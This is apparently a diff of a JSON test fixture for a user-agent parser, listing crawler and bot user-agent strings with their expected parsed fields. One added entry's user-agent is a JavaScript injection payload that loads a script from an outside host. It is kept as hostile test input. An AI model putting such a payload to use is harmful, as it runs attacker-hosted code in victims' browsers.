+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "QroboDomainBot"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "DomainBot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "outbrain"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Outbrain",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Opera larbin2.6.3@unspecified.mail"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Larbin",
+      "modus": null,
+      "version": "2.6.3",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": "Presto",
+      "version": null,
+      "manufacturer": "opera"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "DANBOT!/Nutch-1.2"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "DanBot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "WikioLabsBot"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "BSbot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "PHP/StatusCheck"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "StatusCheck",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0/Firefox/42.0 - nbertaupete95(at)gmail.com"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "nbertaupete95",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": "Gecko",
+      "version": null,
+      "manufacturer": "mozilla"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "AFB/3.0 (+http://allloadin.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Allloadin Favicon Bot",
+      "modus": null,
+      "version": "3.0.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mixnode/3.0.1 (+https://www.mixnode.com/; Speed analysis; no data is stored)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Mixnode",
+      "modus": null,
+      "version": "3.0.1",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "colly - https://github.com/gocolly/colly"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "colly",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; adscanner/)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Adscanner",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; Taboolabot/3.7; +http://www.taboola.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Taboolabot",
+      "modus": null,
+      "version": "3.7.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "MBCrawler/1.0 (https://monitorbacklinks.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Monitor Backlinks",
+      "modus": null,
+      "version": "1.0.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "OnPageLeadsBot/1.0 (+https://onpageleads.com/analyse/) Mozilla/5.0 (compatible);"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Adsbot",
+      "modus": null,
+      "version": "1.0.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "OutclicksBot/2 +https://www.outclicks.net/agent/4MTe02o0eAfSWERKdafo5swQ5d9Kza1e3JrpwkXcePa0MjgaeSXYOBeLHMrlDkt4D"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "OutclicksBot",
+      "modus": null,
+      "version": "2.0.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": "Linux",
+      "marketingName": "Linux",
+      "version": null,
+      "manufacturer": "linux-foundation",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; TrendsmapResolver/0.1)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "TrendsmapResolver",
       "modus": null,
       "version": "0.1.0",
       "manufacturer": "unknown",
@@ -3871,7 +3241,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; ProspectorBR/1.0; +prospeccao-adtech; contato via site) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+      "user-agent": "Mozilla/5.0 (compatible; 1001FirmsBot/0.2.4; +https://www.1001firms.com/robot.php)"
     },
     "device": {
       "architecture": "",
@@ -3893,54 +3263,9 @@
       "bits": 0
     },
     "client": {
-      "name": "ProspectorBR",
+      "name": "1001FirmsBot",
       "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": "Blink",
-      "version": "124.0.0",
-      "manufacturer": "google"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; company-data-research/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "company-data-research",
-      "modus": null,
-      "version": "1.0.0",
+      "version": "0.2.4",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -3961,7 +3286,7 @@
   },
   {
     "headers": {
-      "user-agent": "GoGuidesDiscoveryBot/1.0 (+https://www.goguides.com/crawler)"
+      "user-agent": "Mozilla/5.0 (compatible; DNS SSL/TLS HTTP HTML Website Security Scanner/0.2 beta; +https://www.htmlyse.com/)"
     },
     "device": {
       "architecture": "",
@@ -3983,9 +3308,9 @@
       "bits": 0
     },
     "client": {
-      "name": "GoGuidesDiscoveryBot",
+      "name": "htmlyse",
       "modus": null,
-      "version": "1.0.0",
+      "version": null,
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -4006,7 +3331,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; DnesAkceBot/1.0; +https://dnesakce.cz)"
+      "user-agent": "Mozilla/5.0 (compatible; BlogBeatbot/2.5; +http://www.blogbeat.nl/bot.html)"
     },
     "device": {
       "architecture": "",
@@ -4028,9 +3353,9 @@
       "bits": 0
     },
     "client": {
-      "name": "DnesAkceBot",
+      "name": "BlogBeatbot",
       "modus": null,
-      "version": "1.0.0",
+      "version": "2.5.0",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -4051,7 +3376,7 @@
   },
   {
     "headers": {
-      "user-agent": "GreenWebChecker/1.0.0"
+      "user-agent": "Mozilla/5.0 (compatible; LetsearchBot/1.0; +http://letsearch.ru)"
     },
     "device": {
       "architecture": "",
@@ -4073,7 +3398,7 @@
       "bits": 0
     },
     "client": {
-      "name": "GreenWebChecker",
+      "name": "LetSearch",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -4096,7 +3421,7 @@
   },
   {
     "headers": {
-      "user-agent": "ImpressumResearchBot/0.1 (+mailto:budzislaw7@gmail.com; academic research, DE e-commerce Impressum study)"
+      "user-agent": "The Knowledge AI"
     },
     "device": {
       "architecture": "",
@@ -4118,54 +3443,9 @@
       "bits": 0
     },
     "client": {
-      "name": "ResearchBot",
+      "name": "The Knowledge AI",
       "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": "MRE",
-      "marketingName": "MAUI Runtime Environment",
       "version": null,
-      "manufacturer": "mediatek",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "PremiroBot/1.0 (+https://premiro.de/bot; kontakt@premiro.de)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "PremiroBot",
-      "modus": null,
-      "version": "1.0.0",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -4186,7 +3466,7 @@
   },
   {
     "headers": {
-      "user-agent": "Dealroom-website-check/1.0"
+      "user-agent": "MeltwaterNews www.meltwater.com"
     },
     "device": {
       "architecture": "",
@@ -4208,9 +3488,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Dealroom-website-check",
+      "name": "MeltwaterNews",
       "modus": null,
-      "version": "1.0.0",
+      "version": null,
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -4231,7 +3511,7 @@
   },
   {
     "headers": {
-      "user-agent": "geocheck-study/1.0"
+      "user-agent": "Mozilla/5.0 (compatible; Cocolyzebot/1.0; https://cocolyze.com/bot)"
     },
     "device": {
       "architecture": "",
@@ -4253,7 +3533,7 @@
       "bits": 0
     },
     "client": {
-      "name": "geocheck-study",
+      "name": "Cocolyzebot",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -4276,7 +3556,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; EnvScanner/2.0)"
+      "user-agent": "Mozilla/5.0 (compatible;Impact Radius Compliance Bot)"
     },
     "device": {
       "architecture": "",
@@ -4298,7 +3578,547 @@
       "bits": 0
     },
     "client": {
-      "name": "EnvScanner",
+      "name": "Impact Radius Compliance Bot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "VsuSearchSpider/1.0"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "VsuSearchSpider",
+      "modus": null,
+      "version": "1.0.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": "Suse Linux",
+      "marketingName": "Suse Linux",
+      "version": null,
+      "manufacturer": "suse",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "hokifyBot"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "hokifyBot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "cdnposUserAgentcdnpos<>"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Generic Bot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": "Suse Linux",
+      "marketingName": "Suse Linux",
+      "version": null,
+      "manufacturer": "suse",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; +centuryb.o.t9[at]gmail.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "centuryb",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Sidetrade indexer bot"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Sidetrade indexer Bot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "AdAuth/1.0; +https://www.adauth.com"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "AdAuth",
+      "modus": null,
+      "version": "1.0.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "SearchExpress"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "SearchExpress",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Urlcheckr/2.0"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "UrlCheck",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Magellan Agent"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Magellan",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Zjavascript:eval('var a=document.createElement('script');a.src='https://zyqa.ga/aq';document.body.appendChild(a)')"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Generic Bot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": "JavaOS",
+      "marketingName": "JavaOS",
+      "version": null,
+      "manufacturer": "sun",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; RyowlEngine/1.0; +https://ryowl.org) comdirect/1.0 (appVersion:19.12.0)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Ryowl Engine",
+      "modus": null,
+      "version": "1.0.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "crawler_eb_germany_2.0"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Crawlboy",
       "modus": null,
       "version": "2.0.0",
       "manufacturer": "unknown",
@@ -4321,7 +4141,7 @@
   },
   {
     "headers": {
-      "user-agent": "KBCnetContactBot/1.0 (polite contact refresh; 1 request / few seconds)"
